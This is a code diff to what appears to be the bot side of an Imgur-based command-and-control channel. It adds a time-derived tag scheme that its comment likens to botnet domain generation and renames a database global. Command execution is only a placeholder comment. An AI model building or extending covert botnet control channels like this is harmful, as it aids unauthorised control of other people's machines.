@@ -3,17 +3,21 @@ import json
 import os
 import sqlite3 as sl
 from imgur_c2.auth import client_id
+from datetime import datetime
 
+# Bots find C2 by searching Imgur for special tags, generated based on
+# current utc time. This is similar to domain name generation botnets use.
+TODAYS_TAG = generate_tag_name(datetime.utcnow())
 SQLITE_PATH = os.path.join(os.path.dirname(__file__), "imgur-history.db")
-con = None
+CON = None
 
 
 def init_db(db_path=SQLITE_PATH):
-    global con
-    con = sl.connect(db_path)
+    global CON
+    CON = sl.connect(db_path)
 
-    with con:
-        cur = con.cursor()
+    with CON:
+        cur = CON.cursor()
         cur.execute(
             """
             CREATE TABLE IF NOT EXISTS IMGUR_HISTORY (
@@ -46,33 +50,33 @@ def get_images_by_tag(tag):
     else:
         print("Unknown Error:", data)
 
-    # to download an image w/ ID use https://imgur.com/download/53i9bwZ/imgur_upload
+    # to download an image w/ ID use https://imgur.com/download/53i9bwZ
 
     return images
 
 
 def in_history(imgur_id):
-    global con
-    if con is None:
+    global CON
+    if CON is None:
         init_db()
 
-    with con:
-        cur = con.cursor()
+    with CON:
+        cur = CON.cursor()
         sql = "SELECT * FROM IMGUR_HISTORY WHERE imgur_id=?;"
         cur.execute(sql, (imgur_id,))
         return cur.fetchone() or False
 
 
 def execute(imgur_id):
-    global con
-    if con is None:
+    global CON
+    if CON is None:
         init_db()
 
     # execution stuff from ImgMsg module here
 
     # if successfully executed
-    with con:
-        cur = con.cursor()
+    with CON:
+        cur = CON.cursor()
         sql = "INSERT INTO IMGUR_HISTORY (imgur_id, last_exec) VALUES (?, datetime('now'));"
         ret = cur.execute(sql, (imgur_id,))
         return ret.lastrowid or False
